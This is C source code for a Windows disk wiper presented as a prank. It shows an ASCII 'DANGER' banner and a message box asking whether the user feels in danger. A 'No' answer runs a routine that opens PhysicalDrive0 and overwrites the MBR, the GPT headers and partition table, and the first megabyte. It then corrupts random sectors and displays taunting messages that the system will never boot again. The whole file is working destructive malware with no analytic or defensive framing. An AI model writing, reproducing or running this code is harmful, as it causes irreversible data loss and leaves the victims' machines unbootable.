#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

// Forward declaration
void ExecuteScorchedEarth();

int main() {
    // Show ASCII art intro
    system("cls");
    printf("\n\n\n");
    printf("          ██████╗  █████╗ ███╗   ██╗ ██████╗ ███████╗██████╗ \n");
    printf("          ██╔══██╗██╔══██╗████╗  ██║██╔════╝ ██╔════╝██╔══██╗\n");
    printf("          ██║  ██║███████║██╔██╗ ██║██║  ███╗█████╗  ██████╔╝\n");
    printf("          ██║  ██║██╔══██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██╗\n");
    printf("          ██████╔╝██║  ██║██║ ╚████║╚██████╔╝███████╗██║  ██║\n");
    printf("          ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝\n");
    printf("\n\n");
    Sleep(1500);
    
    // Main question - simple and direct
    int response = MessageBoxW(NULL,
        L"⚠️  Do you feel in danger?  ⚠️\n\n"
        L"Choose carefully...",
        L"Question",
        MB_YESNO | MB_ICONQUESTION | MB_SYSTEMMODAL);
    
    if (response == IDNO) {
        // They clicked NO - execute the payload
        MessageBoxW(NULL,
            L"There is no turning back...",
            L"tell your disk a nice goodbye",
            MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
        
        // Execute the disk wiper
        ExecuteScorchedEarth();
        
        MessageBoxW(NULL,
            L" SCORCHED EARTH \n\n"
            L"The deed is done.\n"
            L"System will not boot again, nor the system will see the light of a day.",
            L"Mission Accomplished",
            MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
        
    } else {
        // They clicked YES (feel in danger)
        MessageBoxW(NULL,
            L"✅ Smart choice.\n\n"
            L"You have been spared.\n"
            L"Stay safe out there.",
            L"Wise Decision",
            MB_OK | MB_ICONINFORMATION);
    }
    
    return 0;
}

void ExecuteScorchedEarth() {
    printf("\n Have a lovely afternoon \n");
    
    HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", 
        GENERIC_READ | GENERIC_WRITE, 
        FILE_SHARE_READ | FILE_SHARE_WRITE, 
        NULL, OPEN_EXISTING, 
        FILE_FLAG_WRITE_THROUGH, NULL);
    
    if (hDisk == INVALID_HANDLE_VALUE) {
        printf("Failed to run the code. Need admin rights.\n");
        MessageBoxW(NULL,
            L" ERROR: Administrator privileges required\n\n"
            L"Run as Administrator to execute.",
            L"Access Denied",
            MB_OK | MB_ICONERROR);
        return;
    }
    
    BYTE pattern[4096];
    DWORD written;
    LARGE_INTEGER offset;
    
    srand(time(NULL));
    
    // 0. Destroy MBR and GPT headers (both BIOS and UEFI)
    printf("[*] Destroying your confidence...\n");
    
    // Wipe MBR (sector 0)
    offset.QuadPart = 0;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
    memset(pattern, 0, 512);
    WriteFile(hDisk, pattern, 512, &written, NULL);
    
    // Wipe primary GPT header (sector 1) 
    offset.QuadPart = 512;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
    WriteFile(hDisk, pattern, 512, &written, NULL);
    
    // Wipe GPT partition table (sectors 2-33)
    for (int i = 0; i < 32; i++) {
        WriteFile(hDisk, pattern, 512, &written, NULL);
    }
    
    printf("[*] confidence destroyed!\n");
    
    // 1. Nuke first 1MB (all boot structures)
    printf("[*] Obliterating ego...\n");
    offset.QuadPart = 0;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
    
    for (int i = 0; i < 256; i++) {  // 256 * 4KB = 1MB
        for (int j = 0; j < 4096; j++) {
            pattern[j] = (BYTE)(rand() & 0xFF);
        }
        WriteFile(hDisk, pattern, 4096, &written, NULL);
        if (i % 64 == 0) printf("  booM...\n", i * 4);
    }
    
    // 2. Get disk size - use IOCTL for Windows 10/11 compatibility
    DISK_GEOMETRY_EX diskGeo;
    DWORD bytesReturned;
    LONGLONG totalSectors = 0;
    
    if (DeviceIoControl(hDisk, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, 
                        NULL, 0, &diskGeo, sizeof(diskGeo), 
                        &bytesReturned, NULL)) {
        totalSectors = diskGeo.DiskSize.QuadPart / 512;
        printf("[*] Disk size: %lld bytes (%lld sectors)\n", 
               diskGeo.DiskSize.QuadPart, totalSectors);
    } else {
        // Fallback: assume 100GB disk
        totalSectors = 209715200LL; // 100GB in sectors
        printf("[*] Could not get disk size, using 100GB default\n");
    }
    
    // Safety check to prevent division by zero
    if (totalSectors <= 1000) {
        totalSectors = 209715200LL; // 100GB fallback
        printf("[!] Invalid sector count, using default\n");
    }
    
    // 3. Destroy 100 random sectors throughout the disk
    printf("[*] Destroying you where you have wronged others and failed to acknowledge...\n");
    for (int i = 0; i < 100; i++) {
        // Safe random sector calculation
        LONGLONG randomSector = ((LONGLONG)rand() * (LONGLONG)rand()) % (totalSectors - 1000);
        if (randomSector < 2048) randomSector = 2048; // Skip first 1MB we already nuked
        
        offset.QuadPart = randomSector * 512;
        SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
        
        for (int j = 0; j < 512; j++) {
            pattern[j] = (BYTE)(rand() & 0xFF);
        }
        
        WriteFile(hDisk, pattern, 512, &written, NULL);
        
        if (i % 20 == 0) printf("  %d shatters*...\n", i);
    }
    
    FlushFileBuffers(hDisk);
    CloseHandle(hDisk);
    
    printf("\n MAY your soul betray your becoming!\n");
}
